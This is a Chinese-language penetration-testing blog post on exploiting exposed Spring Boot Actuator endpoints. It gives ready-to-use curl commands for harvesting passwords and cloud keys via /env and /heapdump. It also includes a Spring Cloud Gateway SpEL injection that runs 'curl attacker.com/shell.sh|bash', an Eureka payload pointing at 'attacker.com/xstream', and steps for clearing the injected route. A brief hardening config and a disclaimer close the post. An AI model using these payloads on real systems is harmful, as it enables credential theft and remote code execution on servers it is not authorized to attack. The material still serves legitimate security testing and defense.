---
title: Spring Boot Actuator 漏洞利用
date: 2025-07-20 08:00:00
tags:
  - 框架安全
  - 渗透测试
categories: 渗透测试
description: Spring Boot Actuator 各端点利用——env 属性窃取密码、heapdump 内存分析、mappings 路由发现、Spring Cloud Gateway 与 Eureka RCE，以及 Jolokia JMX 利用链。
---

## Actuator 端点一览

| 端点 | 风险 |
|------|------|
| `/actuator/env` | 泄露数据库密码/Redis密码/云AK等敏感配置 |
| `/actuator/heapdump` | 内存快照 → 提取明文凭据 |
| `/actuator/mappings` | 所有路由 → 发现隐藏接口 |
| `/actuator/beans` | Bean 信息 |
| `/actuator/conditions` | 自动配置信息 |
| `/actuator/configprops` | 配置属性 |
| `/actuator/gateway` | Spring Cloud Gateway → 可 RCE |

---

## /env 配置泄露

```bash
curl http://target.com/actuator/env
# 常见泄露：
#   spring.datasource.password
#   spring.redis.password
#   spring.cloud.aws.credentials.accessKey
#   alibaba.cloud.access-key
#   management.endpoints.web.exposure.include=*
```

---

## /heapdump 内存分析

```bash
# 下载 heapdump
curl http://target.com/actuator/heapdump -o heapdump

# 用 Eclipse Memory Analyzer Tool (MAT) 或 VisualVM 打开
# 搜索关键词：password, secret, token, accessKey, jdbc, redis
```

---

## Spring Cloud Gateway RCE

```bash
# Step 1: 创建恶意路由
POST /actuator/gateway/routes/hack
Content-Type: application/json

{
  "id": "hack",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {"name": "Result", "value": "#{T(Runtime).getRuntime().exec(\"curl attacker.com/shell.sh|bash\")}"}
  }],
  "uri": "http://example.com"
}

# Step 2: 刷新路由 → 触发代码执行
POST /actuator/gateway/refresh

# Step 3: 清理
DELETE /actuator/gateway/routes/hack
```

---

## /env 修改 + Eureka RCE

```bash
# 修改 eureka.client.serviceUrl.defaultZone 指向恶意 Eureka Server
POST /actuator/env
Content-Type: application/json
{"name":"eureka.client.serviceUrl.defaultZone","value":"http://attacker.com/xstream"}

# 触发 refresh → 加载恶意 XStream payload → RCE
POST /actuator/refresh
```

---

## 防御方案

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: health,info  # 只暴露健康检查
  endpoint:
    env:
      enabled: false
    heapdump:
      enabled: false
```

---

> 本文仅用于授权安全测试与学习，请勿用于非法用途。
